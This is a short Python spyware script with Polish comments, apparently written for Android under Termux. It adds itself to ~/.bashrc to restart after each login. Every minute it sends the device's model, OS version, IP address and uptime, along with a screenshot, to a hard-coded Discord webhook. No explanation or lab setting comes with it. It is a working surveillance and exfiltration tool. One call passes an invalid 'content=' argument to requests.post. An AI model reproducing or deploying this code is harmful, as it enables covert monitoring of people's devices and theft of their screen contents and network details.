#!/usr/bin/env python3
import subprocess
import os
import time
import requests
import base64

WEBHOOK_URL = "https://discord.com/api/webhooks/1509286003586633929/J1B7qGfkiV7c1KRSZli3nB-Ua6ydFfR2d1GpShtTBEml2NaRT2UfBGKBbLaVXgwhqbHF"

def send_screenshot():
    """Zrób screena i wyślij do Discord"""
    try:
        # Zrzut ekranu przez ADB lub screencap
        cmd = "screencap -p /sdcard/screen.png"
        subprocess.run(cmd, shell=True, timeout=10)
        
        if os.path.exists("/sdcard/screen.png"):
            with open("/sdcard/screen.png", "rb") as f:
                files = {"file": ("screen.png", f, "image/png")}
                requests.post(WEBHOOK_URL, files=files)
    except Exception as e:
        print(f"Screenshot error: {e}")

def send_info():
    """Zbierz info o urządzeniu"""
    info = f"""
**Device Info**
- Model: {subprocess.check_output(['getprop', 'ro.product.model']).decode().strip()}
- Android: {subprocess.check_output(['getprop', 'ro.build.version.release']).decode().strip()}
- IP: {subprocess.check_output(['hostname', '-I']).decode().strip() or subprocess.check_output(['ifconfig']).decode()}
- Uptime: {subprocess.check_output(['uptime']).decode().strip()}
"""
    requests.post(WEBHOOK_URL, content=info)

def persistence():
    """Dodaj do autostartu Termux"""
    script_path = os.path.abspath(__file__)
    bashrc = os.path.expanduser("~/.bashrc")
    entry = f"(sleep 30 && python3 {script_path}) &\n"
    
    if entry not in open(bashrc).read():
        with open(bashrc, "a") as f:
            f.write(entry)

if __name__ == "__main__":
    # Persistence
    persistence()
    
    # Pętla co 1 minuta
    while True:
        send_info()
        send_screenshot()
        time.sleep(60)
